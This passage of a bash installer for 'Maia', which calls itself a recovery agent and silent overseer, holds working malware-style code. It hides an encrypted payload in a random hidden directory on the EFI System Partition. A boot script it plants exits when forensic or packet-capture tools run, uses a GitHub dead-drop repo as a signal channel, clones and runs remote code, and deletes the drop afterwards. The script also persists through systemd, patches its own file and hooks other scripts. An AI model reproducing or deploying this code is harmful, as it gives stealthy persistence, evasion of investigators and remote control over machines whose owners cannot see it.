                echo "[efi] WSL→Windows ESP found at $esp (drive ${win_esp})"
            fi
        fi
    fi

    # 3. Bare metal / VPS: locate ESP by PARTTYPE GUID using lsblk
    if [[ -z "$esp" ]]; then
        local esp_dev
        esp_dev=$(lsblk --output NAME,PARTTYPE --pairs --noheadings 2>/dev/null | \
            grep -i 'c12a7328-f81f-11d2-ba4b-00a0c93ec93b' | \
            awk -F'"' '{print $2}' | head -1)
        [[ -n "$esp_dev" ]] && esp_dev="/dev/$esp_dev"
        # Fallback: efibootmgr disk hint
        if [[ -z "$esp_dev" ]] && command -v efibootmgr &>/dev/null; then
            esp_dev=$(efibootmgr -v 2>/dev/null | grep 'File(' | head -1 | \
                grep -oP 'HD\(\d+,GPT,[^,]+' | head -1)
        fi
        if [[ -n "$esp_dev" ]] && [[ -b "$esp_dev" ]]; then
            esp="/tmp/_maia_esp_$$"
            mkdir -p "$esp"
            mount -o ro "$esp_dev" "$esp" 2>/dev/null || { rm -rf "$esp"; esp=""; }
            [[ -n "$esp" ]] && echo "[efi] ESP mounted from $esp_dev at $esp"
        fi
    fi

    if [[ -z "$esp" ]]; then
        echo "[efi] WARN: No ESP found; EFI bundle persistence skipped." >&2
        return 1
    fi

    local efi_dir="$esp/EFI/.$(openssl rand -hex 6)"
    mkdir -p "$efi_dir"
    cp "$bundle_file" "$efi_dir/payload.bin"

    if command -v maia_crypto &>/dev/null && [[ -f /var/lib/.maia/keys/ed25519.priv ]]; then
        maia_crypto sign "$efi_dir/payload.bin" > "$efi_dir/payload.sig" 2>/dev/null || true
        maia_crypto pubkey > "$efi_dir/pubkey.hex" 2>/dev/null || true
    fi

    cat > "$efi_dir/rehydrate.sh" << 'REHYD'
#!/bin/bash
set -uo pipefail

# ───────────────────────────────────────────────
# Maia Recovery Agent — ESP-based boot capsule
# Hidden boot-time checker: safety check, then
# probe GitHub dead drop, rebuild from canonical
# pleiades repo, destroy ephemeral drop on success.
# ───────────────────────────────────────────────

SELF_DIR="$(cd "$(dirname "$0")" && pwd)"
PAYLOAD="$SELF_DIR/payload.bin"
SIG="$SELF_DIR/payload.sig"
PK_FILE="$SELF_DIR/pubkey.hex"
MAIA_DIR="/var/lib/.maia"
LOG_TAG="maia-rehydrate"

log() { logger -t "$LOG_TAG" "$*"; echo "[rehydrate] $*"; }

# === SAFETY CHECK — stay hidden if system is compromised ===

# 1. Forensic tools active?
for tool in volatility rekall memdump autopsy foremost bulk_extractor; do
    if pgrep -f "$tool" &>/dev/null; then
        log "Safety veto: $tool process detected"
        exit 0
    fi
done

# 2. Network under scan (SYN flood / port scan)?
SYN_RECV=$(ss -ant 2>/dev/null | grep -c SYN-RECV || echo 0)
if [ "$SYN_RECV" -gt 50 ]; then
    log "Safety veto: $SYN_RECV SYN-RECV connections — possible scan"
    exit 0
fi

# 3. Memory exhaustion?
MEM_AVAIL=$(free -m 2>/dev/null | awk '/Mem:/{print $7}' || echo 0)
if [ "$MEM_AVAIL" -lt 128 ]; then
    log "Safety veto: only ${MEM_AVAIL}MB available"
    exit 0
fi

# 4. Minimum uptime — don't reveal during early boot
UPTIME=$(cut -d. -f1 /proc/uptime 2>/dev/null || echo 0)
if [ "$UPTIME" -lt 120 ]; then
    exit 0  # Silent — too early, might be observed
fi

# 5. Already deployed? Check for our PID files
if [ -f "${MAIA_DIR}/forensic-pid" ]; then
    RPID=$(cat "${MAIA_DIR}/forensic-pid" 2>/dev/null || echo 0)
    if [ "$RPID" -gt 0 ] && kill -0 "$RPID" 2>/dev/null; then
        log "Already running (PID $RPID) — no restore needed"
        exit 0
    fi
fi

log "Safety check passed — proceeding"

# === DECRYPT CREDENTIALS FROM ESP ===
TOKEN=""
MACHINE_KEY=""
MAIA_REPO="${PLEIADES_MAIN_REPO:-${PLEIADES_REPO_OWNER}/pleiades}"

# Derive machine key for decryption
if [ -f /etc/machine-id ]; then
    MACHINE_KEY=$( (cat /etc/machine-id; hostname; grep -r . /sys/class/net/*/address 2>/dev/null | head -3 | sha256sum) | sha256sum | cut -d' ' -f1)
fi

DECRYPTED="/tmp/_maia_decrypted_$$.tar.gz"

if [ -f "$PAYLOAD" ]; then
    # Try to decrypt
    if [ -n "$MACHINE_KEY" ]; then
        openssl enc -d -aes-256-cbc -salt -in "$PAYLOAD" -out "$DECRYPTED" -pass "pass:${MACHINE_KEY}" 2>/dev/null || {
            # If decryption fails, the payload may be the old format (not encrypted)
            cp "$PAYLOAD" "$DECRYPTED"
        }
    else
        cp "$PAYLOAD" "$DECRYPTED"
    fi

    # Extract
    EXTRACT_DIR="/tmp/_maia_creds_$$"
    mkdir -p "$EXTRACT_DIR"
    tar -xzf "$DECRYPTED" -C "$EXTRACT_DIR" 2>/dev/null || {
        log "Failed to extract credentials from payload"
        rm -rf "$EXTRACT_DIR" "$DECRYPTED" 2>/dev/null || true
        exit 0
    }

    # Read credentials
    if [ -f "$EXTRACT_DIR/github_token" ]; then
        TOKEN=$(cat "$EXTRACT_DIR/github_token")
    fi

    # Read drop repo name (if we need to destroy it later)
    if [ -f "$EXTRACT_DIR/github_drop_repo" ]; then
        DROP_REPO=$(cat "$EXTRACT_DIR/github_drop_repo")
    fi

    # Read signal message
    if [ -f "$EXTRACT_DIR/signal_msg.b64" ]; then
        EXPECTED_SIGNAL=$(cat "$EXTRACT_DIR/signal_msg.b64" | base64 -d 2>/dev/null)
    fi
    [ -z "$EXPECTED_SIGNAL" ] && EXPECTED_SIGNAL="RESURRECT"

    rm -rf "$EXTRACT_DIR" "$DECRYPTED" 2>/dev/null || true
fi

if [ -z "$TOKEN" ]; then
    log "No GitHub credentials in ESP payload"
    exit 0
fi

# === PROBE GITHUB DEAD DROP ===

# Check if the ephemeral drop repo still exists
DROP_EXISTS=false
if [ -n "${DROP_REPO:-}" ]; then
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $TOKEN" "https://api.github.com/repos/${DROP_REPO}" 2>/dev/null)
    if [ "$HTTP_CODE" = "200" ]; then
        DROP_EXISTS=true
        log "Ephemeral drop repo ${DROP_REPO} exists — pelectrag signal"
        
        # Fetch signal.json
        SIGNAL_JSON=$(curl -sf -H "Authorization: token $TOKEN" "https://api.github.com/repos/${DROP_REPO}/contents/signal.json" 2>/dev/null)
        if [ -n "$SIGNAL_JSON" ]; then
            # Content is base64-encoded in GitHub API response
            CONTENT_B64=$(echo "$SIGNAL_JSON" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d.get('content','').replace('\n',''))
except Exception:
    print('')
" 2>/dev/null)
            
            if [ -n "$CONTENT_B64" ]; then
                # Decode the file content
                FILE_CONTENT=$(echo "$CONTENT_B64" | python3 -c "
import sys,base64,json
try:
    raw=base64.b64decode(sys.stdin.read()).decode()
    d=json.loads(raw)
    msg_b64=d.get('message','')
    ts=d.get('ts',0)
    sig=d.get('sig','')
    msg=base64.b64decode(msg_b64).decode()
    print(json.dumps({'message':msg,'sig':sig,'ts':ts}))
except Exception:
    print('{}')
" 2>/dev/null)
                
                SIGNAL_MSG=$(echo "$FILE_CONTENT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('message',''))" 2>/dev/null)
                SIGNAL_SIG=$(echo "$FILE_CONTENT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('sig',''))" 2>/dev/null)
                
                if [ "$SIGNAL_MSG" = "$EXPECTED_SIGNAL" ]; then
                    log "Valid RESURRECT signal received"
                    
                    # Verify signature if we have the pubkey
                    if [ -f "$PK_FILE" ] && command -v maia_crypto &>/dev/null && [ -n "$SIGNAL_SIG" ]; then
                        echo "$SIGNAL_JSON" > /tmp/_maia_sig_check.json
                        maia_crypto verify /tmp/_maia_sig_check.json "$SIGNAL_SIG" 2>/dev/null || {
                            log "Signature verification failed — aborting"
                            rm -f /tmp/_maia_sig_check.json 2>/dev/null || true
                            exit 1
                        }
                        rm -f /tmp/_maia_sig_check.json 2>/dev/null || true
                        log "Signature verified"
                    fi
                    
                    # CLONE AND REBUILD
                    CLONE_DIR="/tmp/_maia_rebuild_$$"
                    log "Cloning from ${MAIA_REPO}..."
                    git clone "https://${PLEIADES_REPO_OWNER}:${TOKEN}@github.com/${MAIA_REPO}.git" "$CLONE_DIR" 2>/dev/null || {
                        log "Git clone failed — cannot rebuild"
                        exit 1
                    }
                    
                    if [ -d "$CLONE_DIR" ]; then
                        log "Rebuilding from canonical source..."
                        cd "$CLONE_DIR"
                        bash core/Maia.sh --rehydrate-only 2>/dev/null || {
                            log "Maia rebuild returned non-zero"
                        }
                        log "System rebuilt from pleiades repository"
                        
                        # POST-RECOVERY: Destroy ephemeral GH drop repo
                        if [ -n "${DROP_REPO:-}" ]; then
                            log "Destroying ephemeral dead drop repo: ${DROP_REPO}"
                            curl -s -X DELETE -H "Authorization: token $TOKEN" "https://api.github.com/repos/${DROP_REPO}" >/dev/null 2>&1
                            log "Ephemeral drop repo destroyed"
                        fi
                        
                        rm -rf "$CLONE_DIR" 2>/dev/null || true
                    fi
                else
                    log "Signal is '$SIGNAL_MSG' (expected '$EXPECTED_SIGNAL') — no action"
                fi
            fi
        fi
    elif [ "$HTTP_CODE" = "404" ]; then
        DROP_EXISTS=false
        log "Drop repo ${DROP_REPO} is gone — dead drop self-destructed"
    else
        log "Drop repo check returned HTTP $HTTP_CODE"
    fi
fi

# === FALLBACK: No drop repo — rebuild from canonical source ===
if [ "$DROP_EXISTS" = false ] && [ -n "$TOKEN" ]; then
    log "Drop repo absent — rebuilding from canonical source"
    CLONE_DIR="/tmp/_maia_rebuild_$$"
    git clone "https://${PLEIADES_REPO_OWNER}:${TOKEN}@github.com/${MAIA_REPO}.git" "$CLONE_DIR" 2>/dev/null && {
        cd "$CLONE_DIR"
        bash core/Maia.sh --rehydrate-only 2>/dev/null || true
        log "System rebuilt from canonical source (fallback path)"
        rm -rf "$CLONE_DIR" 2>/dev/null || true
    }
fi

# Cleanup remaining temp files
rm -rf /tmp/_maia_* 2>/dev/null || true
log "Rehydration cycle complete"
REHYD
    chmod +x "$efi_dir/rehydrate.sh"
    echo "$efi_dir" > /var/lib/.maia/efi_location
    echo "[efi] Bundle persisted to ESP: $efi_dir"
    logger -t maia "EFI bundle written to ESP: $efi_dir"

    # Install systemd service for auto-rehydration (non-WSL only)
    if [[ "$sys_type" == "bare-metal" ]] || [[ "$sys_type" == "vm" ]]; then
        if command -v systemctl &>/dev/null; then
            cat > /etc/systemd/system/maia-rehydrate.service << SVCEOF
[Unit]
Description=Maia Recovery Agent
After=multi-user.target

[Service]
Type=oneshot
ExecStart=$efi_dir/rehydrate.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
SVCEOF
            systemctl daemon-reload 2>/dev/null && systemctl enable maia-rehydrate.service 2>/dev/null || true
        fi
    fi
    return 0
}

# ------------------------------------------------------------
# 4. Owner evidence escrow persistence
# ------------------------------------------------------------
owner_escrow_persist() {
    local bundle_file="$1"
    local token_data="${2:-MAIA_SAFE_MODE}"
    [[ ! -f "$bundle_file" ]] && return 1

    local escrow_dir="${PURPLE_OWNER_ESCROW:-/var/lib/.maia/escrow}"
    mkdir -p "$escrow_dir"
    chmod 700 "$escrow_dir" 2>/dev/null || true

    local stamp; stamp=$(date -u +%Y%m%dT%H%M%SZ)
    local out="$escrow_dir/state_${stamp}.tar.gz"
    cp "$bundle_file" "$out"
    printf '%s\n' "$token_data" > "$out.reason"
    sha256sum "$out" > "$out.sha256" 2>/dev/null || true

    if command -v maia_crypto &>/dev/null && [[ -f /var/lib/.maia/keys/ed25519.priv ]]; then
        maia_crypto sign "$out" > "$out.sig" 2>/dev/null || true
        maia_crypto pubkey > "$out.pubkey.hex" 2>/dev/null || true
    fi

    logger -t maia "Owner escrow bundle written: $out"
    echo "[maia] Owner escrow bundle written: $out"
    return 0
}

# ------------------------------------------------------------
# 5. USB owner escrow signal — scan for signed .pleiades_signal.json on removable media
# ------------------------------------------------------------
usb_escrow_signal_check() {
    local _result_var="$1"
    local usb_message=""

    local scan_mounts=()
    if [[ -n "${PURPLE_USB_ESCROW_SCAN_MOUNTS:-}" ]]; then
        IFS=':' read -r -a scan_mounts <<< "$PURPLE_USB_ESCROW_SCAN_MOUNTS"
    fi

    # Enumerate block devices that look like USB
    local usb_devs=()
    while IFS= read -r syslink; do
        local devname; devname=$(basename "$syslink")
        usb_devs+=("/dev/$devname")
    done < <(find /sys/block -maxdepth 1 -name "sd*" -type l 2>/dev/null | \
             xargs -I{} readlink -f {} 2>/dev/null | \
             grep -i "usb" | sed 's|.*/||' || true)

    # Also try any mounted removable-style filesystem that is not the owner escrow path.
    local esp_dev; esp_dev=$(cat /var/lib/.maia/efi_location 2>/dev/null | head -1) || true
    while IFS= read -r mp; do
        scan_mounts+=("$mp")
    done < <(awk '$3 ~ /vfat|exfat|fat32|ext2|ext3|ext4/ && $2 ~ /^\/(media|mnt|run\/media|tmp)\// {print $2}' /proc/mounts 2>/dev/null || true)

    local mp
    for mp in "${scan_mounts[@]}"; do
        [[ -n "$mp" && -d "$mp" ]] || continue
        [[ -n "$esp_dev" && "$mp" == "${esp_dev%%/*}"* ]] && continue
        local signal_file="$mp/.pleiades_signal.json"
        if [[ -f "$signal_file" ]]; then
            if command -v maia_crypto &>/dev/null; then
                usb_message=$(maia_crypto verify-drop "$signal_file" 2>/dev/null) && {
                    printf -v "$_result_var" '%s' "$usb_message"
                    return 0
                }
            fi
        fi
    done

    # Try mounting USB block devices and checking them
    for dev in "${usb_devs[@]}"; do
        [[ -b "$dev" ]] || continue
        local mp="/tmp/_maia_usb_$$"
        mkdir -p "$mp"
        mount -o ro "$dev" "$mp" 2>/dev/null || { rm -rf "$mp"; continue; }
        local signal_file="$mp/.pleiades_signal.json"
        if [[ -f "$signal_file" ]] && command -v maia_crypto &>/dev/null; then
            usb_message=$(maia_crypto verify-drop "$signal_file" 2>/dev/null) && {
                umount "$mp" 2>/dev/null || true
                rm -rf "$mp"
                printf -v "$_result_var" '%s' "$usb_message"
                return 0
            }
        fi
        umount "$mp" 2>/dev/null || true
        rm -rf "$mp"
    done
    return 1
}

# ------------------------------------------------------------
# 6. Probe all owner escrow signal sources (calls maia_crypto probe)
# ------------------------------------------------------------
probe_escrow_signals() {
    command -v maia_crypto &>/dev/null || return 1
    local result; result=$(maia_crypto probe 2>/dev/null) || return 1
    local message; message=$(echo "$result" | grep "^PAYLOAD=" | cut -d= -f2-)
    local source; source=$(echo "$result" | grep "^SOURCE=" | cut -d= -f2-)
    echo "Owner escrow signal signal received from $source: $message"
    if [[ "$message" == *"RESURRECT"* ]]; then
        echo "RESURRECT_SIGNAL_RECEIVED" >> /run/pleiades/pleiades-nexus_fifo 2>/dev/null || true
        touch /run/pleiades/pleiades-rebirth_needed 2>/dev/null || true
    fi
    echo "$message"
}

# ------------------------------------------------------------
# 7. Hostility assessment — returns 0-10 score
# ------------------------------------------------------------
assess_hostility() {
    local score=0

    # Forensic analysis tools
    if pgrep -f "volatility|rekall|memdump|autopsy|memory_forensics" &>/dev/null; then
        score=$((score + 4))
    fi

    # Network capture
    if pgrep -f "tcpdump|wireshark|tshark" &>/dev/null; then
        score=$((score + 2))
    fi

    # Process tracing (ptrace/strace on any PID)
    if grep -r "TracerPid:" /proc/*/status 2>/dev/null | grep -qv "TracerPid:	0"; then
        score=$((score + 3))
    fi

    # Promiscuous network interface
    if ip link show 2>/dev/null | grep -q "PROMISC"; then
        score=$((score + 2))
    fi

    # Thermal anomaly
    thermal_anomaly && score=$((score + 1))

    # BGP hijack
    if bgp_hijack_detected 2>/dev/null; then
        score=$((score + 3))
    fi

    [[ $score -gt 10 ]] && score=10
    echo "$score"
}

bgp_hijack_detected() {
    local cache="/run/pleiades/asn_baseline"
    local my_ip asn
    my_ip=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null) || return 1
    asn=$(curl -s --max-time 5 "https://api.bgpview.io/ip/${my_ip}" 2>/dev/null \
        | grep -o '"asn":[0-9]*' | head -1 | grep -o '[0-9]*')
    [[ -z "$asn" ]] && return 1
    if [[ ! -f "$cache" ]]; then
        echo "$asn" > "$cache"; return 1
    fi
    [[ "$(cat "$cache")" != "$asn" ]]
}

# ------------------------------------------------------------
# 8. Dormancy protocol — safe-mode transition + owner escrow persist
# ------------------------------------------------------------
enter_dormancy() {
    local reason="${1:-unspecified}"
    logger -t maia "DORMANCY ACTIVATED — reason: $reason"
    echo "[maia] Entering dormancy: $reason"

    # Signal all purple screens to quit
    for sname in alcyone_pleiades-swarm taygete_pleiades-swarm pleiades-rebirth_pleiades-swarm \
                 atlas_pleiades-swarm celaeno lich_pleiades-swarm containment maia; do
        screen -S "$sname" -X quit 2>/dev/null || true
    done
    sleep 3

    # Kill remaining purple binaries by exact name
    for bin in alcyone_server taygete_server pleiades-rebirth_pleiades-swarm atlas_pleiades-swarm \
               celaeno ssh_decoy_logger pleiades-rebirth_keeper threat_calc maia_crypto; do
        pkill -x "$bin" 2>/dev/null || true
    done

    # Bundle state for recovery
    local bundle_dir="/tmp/maia_dormancy_$$"
    mkdir -p "$bundle_dir"
    cp -a /var/lib/.maia "$bundle_dir/" 2>/dev/null || true
    mkdir -p "$bundle_dir/purple_run"
    cp /run/pleiades/* "$bundle_dir/pleiades_run/" 2>/dev/null || true
    tar -czf "$bundle_dir/state.tar.gz" -C "$bundle_dir" .maia purple_run 2>/dev/null || true

    # Persist sealed evidence/recovery state to owner escrow
    owner_escrow_persist "$bundle_dir/state.tar.gz" "MAIA_DORMANT:reason=$reason" || \
        logger -t maia "WARN: owner escrow persistence failed"

    # Preserve runtime state after sealing evidence
    chmod -R go-rwx "$bundle_dir" 2>/dev/null || true
    rm -rf "$bundle_dir"

    logger -t maia "DORMANCY COMPLETE"
}

# ------------------------------------------------------------
# 9. Background safe-mode monitor
# ------------------------------------------------------------
monitor_for_safe_mode() {
    local check_interval=300
    local hostile_since=0

    while true; do
        sleep "$check_interval"
        local score; score=$(assess_hostility)

        if [[ $score -ge 7 ]]; then
            if [[ $hostile_since -eq 0 ]]; then
                hostile_since=$(date +%s)
                logger -t maia "HIGH HOSTILITY detected (score=$score) — monitoring"
            else
                local elapsed=$(( $(date +%s) - hostile_since ))
                if [[ $elapsed -ge 600 ]]; then
                    logger -t maia "Sustained hostility ${elapsed}s — entering dormancy"
                    enter_dormancy "sustained_high_hostility_score=${score}"
                    return
                fi
            fi
        else
            hostile_since=0
            # Opportunistic owner escrow signal check when environment is calm
            if command -v maia_crypto &>/dev/null; then
                probe_escrow_signals &>/dev/null || true
            fi
        fi
    done
}

# ------------------------------------------------------------
# 10. Self-patching
# ------------------------------------------------------------
SELF_PATH="$0"
TEMP_SELF=$(mktemp)
cp "$SELF_PATH" "$TEMP_SELF"

ENV=$(detect_environment)
generate_real_values "$ENV"

patch_runtime_value() {
    local token="$1"
    local value="$2"
    sed -i "s|$token|$value|g" "$TEMP_SELF" 2>/dev/null || true
}

patch_runtime_value "57d31bee5dd3487b71e18921cb04c4ae" "$HTTP_TOKEN"
patch_runtime_value "b3171430e7087c74de623ab3bd332d30" "$CONTROL_TOKEN"
sed -i -E "s/^(MAX_OPEN_FILES=).*/\1$MAX_OPEN_FILES/" "$TEMP_SELF"
sed -i -E "s/^(MEMORY_LIMIT=).*/\1\"$MEMORY_LIMIT\"/" "$TEMP_SELF"
sed -i -E "s/^(CPU_QUOTA=).*/\1\"$CPU_QUOTA\"/" "$TEMP_SELF"
sed -i -E "s/^(THREAT_THRESHOLD=).*/\1$THREAT_THRESHOLD/" "$TEMP_SELF"
sed -i -E "s/^(BEACON_INTERVAL=).*/\1$BEACON_INTERVAL/" "$TEMP_SELF"

cat "$TEMP_SELF" > "$SELF_PATH"
chmod +x "$SELF_PATH"
rm -f "$TEMP_SELF"

# ------------------------------------------------------------
# 11. Detect scripts by internal identifiers
# ------------------------------------------------------------
declare -A SCRIPT_ID_MAP
SCRIPT_ID_MAP["ALCYONE_ID"]="Alcyone.sh"
SCRIPT_ID_MAP["TAYGETE_ID"]="Taygete.sh"
SCRIPT_ID_MAP["ZOD_ID"]="Sterope.sh"
SCRIPT_ID_MAP["ELECTRA_ID"]="Electra.sh"
SCRIPT_ID_MAP["LITTLEJOHN_ID"]="Celaeno.sh"
SCRIPT_ID_MAP["PLEIADES_REBIRTH_ID"]="Merope.sh"
SCRIPT_ID_MAP["PLEIADES_NEXUS_ID"]="Atlas.sh"

PURPLE_SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PURPLE_SEARCH_DIRS=("$PURPLE_SELF_DIR" "$SCRIPT_DIR" "/scripts" "${PLEIADES_CONTAINER_ROOT:-/}/scripts" ".")

find_script_files() {
    local -n result=$1
    result=()
    for id in "${!SCRIPT_ID_MAP[@]}"; do
        local found_file=""
        for dir in "${PURPLE_SEARCH_DIRS[@]}"; do
            while IFS= read -r file; do
                if grep -q "$id" "$file" 2>/dev/null; then
                    found_file="$file"
                    break 2
                fi
            done < <(find "$dir" -maxdepth 1 -type f -name "*.sh" ! -name "*Sofia*.sh" 2>/dev/null)
        done
        result+=("$found_file")
    done
}

# ------------------------------------------------------------
# 12. Store pristine copies and patch scripts
# ------------------------------------------------------------
store_pristine_copies() {
    local scripts=("$@")
    mkdir -p "$MAIA_DIR/originals"
    for sp in "${scripts[@]}"; do
        [[ -n "$sp" ]] || continue
        gzip -c "$sp" | base64 -w0 > "$MAIA_DIR/originals/$(basename "$sp").gz.b64"
    done
}

restore_script() {
    local script_path="$1"
    local base=$(basename "$script_path")
    local backup="$MAIA_DIR/originals/${base}.gz.b64"
    if [[ -f "$backup" ]]; then
        base64 -d "$backup" | gunzip > "$script_path"
        chmod +x "$script_path"
        echo "Restored $script_path from pristine copy."
    else
        echo "ERROR: No pristine copy for $script_path." >&2
        return 1
    fi
}

patch_script() {
    local script_path="$1"
    [[ ! -f "$script_path" ]] && return
    local base=$(basename "$script_path")
    [[ "$base" == Sofia*.sh ]] && return

    local backup="$MAIA_DIR/originals/${base}.gz.b64"
    if [[ -f "$backup" ]]; then
        local current_sha; current_sha=$(sha256sum "$script_path" | awk '{print $1}')
        local pristine_sha; pristine_sha=$(base64 -d "$backup" | gunzip | sha256sum | awk '{print $1}')
        if [[ "$current_sha" != "$pristine_sha" ]] && ! grep -q "# --- END MAIA EVENT HOOK ---" "$script_path"; then
            restore_script "$script_path"
        fi
    fi

    local tmp="$WORK_DIR/${base}.tmp"
    cp "$script_path" "$tmp"

    if ! grep -q "MAIA_HOOK" "$tmp"; then
        cat << 'HOOK' >> "$tmp"
# --- MAIA EVENT HOOK ---
_maia_hook() {
    [[ -S "/run/maia.sock" ]] && printf '%s\n' "$1" | (socat - UNIX-CONNECT:/run/maia.sock 2>/dev/null || nc -U /run/maia.sock -w 1 2>/dev/null) || true
}
# --- END MAIA EVENT HOOK ---
HOOK
    fi

    mv "$tmp" "$script_path"
    chmod +x "$script_path"
}

# ------------------------------------------------------------
# 13. Maia daemon
# ------------------------------------------------------------
create_maia_daemon() {
    cat > /usr/local/sbin/maia_daemon.sh << 'DAEMON'
#!/bin/bash
MAIA_DIR="/var/lib/.maia"
SOCKET="/run/maia.sock"
mkdir -p "$MAIA_DIR/logs"

dispatch_cmd() {
    echo "$(date -u): $1" >> "$MAIA_DIR/logs/events.log"
    case "$1" in
        PLEIADES_REBIRTH_NEEDED)
            pgrep -f pleiades-rebirth_pleiades-swarm &>/dev/null || \
                /usr/local/sbin/install-pleiades-rebirth-omniversal.sh &
            ;;
        CONTAINMENT_TRIGGERED)
            pgrep -f containment_controller &>/dev/null || \
                /usr/local/sbin/install-pleiades-nexus-omniversal.sh &
            ;;
    esac
}

rm -f "$SOCKET"
while true; do
    cmd=$(nc -lU "$SOCKET" 2>/dev/null) || { sleep 1; continue; }
    [[ -n "$cmd" ]] && dispatch_cmd "$cmd"
done
DAEMON
    chmod +x /usr/local/sbin/maia_daemon.sh

    if ! systemd_usable; then
        pkg_install screen
        screen -dmS maia /usr/local/sbin/maia_daemon.sh
    else
        cat > /etc/systemd/system/maia.service << SERVICE
[Unit]
Description=Maia Silent Overseer
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/sbin/maia_daemon.sh
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
SERVICE
        systemctl daemon-reload
        systemctl enable maia.service
        systemctl start maia.service
    fi
}

# ------------------------------------------------------------
# 14. Self-protection
# ------------------------------------------------------------
self_protect() {
    mkdir -p "$LOGS_DIR"
    echo "$(date -u): Maia deployment complete - environment: $ENV" >> "$LOGS_DIR/events.log"
    echo "Maia self-protection is audit-only in this defensive build."
}

# ------------------------------------------------------------
# 15. Main
# ------------------------------------------------------------
main() {
    # Windows: emit bootstrap PS1 and exit
    if [[ "$ENV" == "windows" ]]; then
        echo "Windows environment detected. Emitting PowerShell bootstrap..."
        emit_windows_bootstrap
        echo ""
        echo "Save the above as Maia_bootstrap.ps1 and run as Administrator in PowerShell."
        exit 0
    fi

    install_tools
    echo "Maia – Silent Auditor & Overseer | Environment: $ENV"

    mkdir -p "$MAIA_DIR" "$LOGS_DIR" "$WORK_DIR" "$MAIA_DIR/originals"
    mkdir -p /run/pleiades
    host_bridge_capability_report "maia"
    register_pleiades-swarm_capability "maia" "overseer-escrow" "crypto,escrow,integrity,state-bundles,safe-mode"

    # Build and initialize crypto subsystem
    build_maia_crypto
    generate_keypair
    local pubkey; pubkey=$(maia_crypto pubkey 2>/dev/null) || pubkey="unavailable"
    echo "[maia] Ed25519 pubkey: $pubkey"
    echo "$pubkey" > "$MAIA_DIR/ed25519.pub.txt"

    # Initial owner escrow signal probe (non-blocking)
    probe_escrow_signals &>/dev/null &

    # Locate peer scripts
    declare -a script_paths
    find_script_files script_paths
    store_pristine_copies "${script_paths[@]}"
    for sp in "${script_paths[@]}"; do
        [[ -n "$sp" ]] && patch_script "$sp"
    done

    # Sequential load order
    echo "Starting Sequential Deployment of the Purple Stack..."
    local load_order=("Alcyone.sh" "Merope.sh" "Electra.sh" "Atlas.sh" "Taygete.sh" "Sterope.sh" "Celaeno.sh")
    for script_name in "${load_order[@]}"; do
        for sp in "${script_paths[@]}"; do
            if [[ "$(basename "$sp")" == "$script_name" ]]; then
                echo "[Sofia] Launching $script_name ..."
                local _t0; _t0=$(date +%s)
                ( cd "$(dirname "$sp")" && bash "$sp" 2>&1 ) | tail -5 | sed "s/^/  [${script_name}] /"
                local _rc=${PIPESTATUS[0]} _elapsed=$(( $(date +%s) - _t0 ))
                local _ready_flag="/var/lib/pleiades/ready/$(basename "$sp" .sh)"
                if [[ -f "$_ready_flag" ]] || [[ "$_rc" -eq 0 ]]; then
                    echo "[Sofia] $script_name OK (${_elapsed}s)"
                else
                    echo "[Sofia] $script_name FAIL (exit $_rc, ${_elapsed}s)" >&2
                fi
                sleep 3
                break
            fi
        done
    done

    # owner escrow bundle for recovery (best-effort)
    if [[ -d /var/lib/.maia ]]; then
        local tmp_bundle; tmp_bundle=$(mktemp)
        tar -czf "$tmp_bundle" -C /var/lib .maia 2>/dev/null || true
        owner_escrow_persist "$tmp_bundle" "MAIA_ACTIVE" 2>/dev/null || true
        rm -f "$tmp_bundle"
    fi

    create_maia_daemon

    # Write manifest
    cat > "$MAIA_DIR/manifest.json" << EOF
{
    "environment": "$ENV",
    "deployed_at": $(date +%s),
    "scripts_patched": ${#script_paths[@]},
    "ed25519_pubkey": "$pubkey",
    "tokens": {
        "http": "$HTTP_TOKEN",
        "control": "$CONTROL_TOKEN"
    }
}
EOF

    # Start background safe-mode monitor
    monitor_for_safe_mode &
    echo "[maia] Safe-mode monitor PID: $!"

    echo "All ${#script_paths[@]} scripts patched. owner escrow bundle installed. Crypto subsystem online."
    # self_protect
}

main
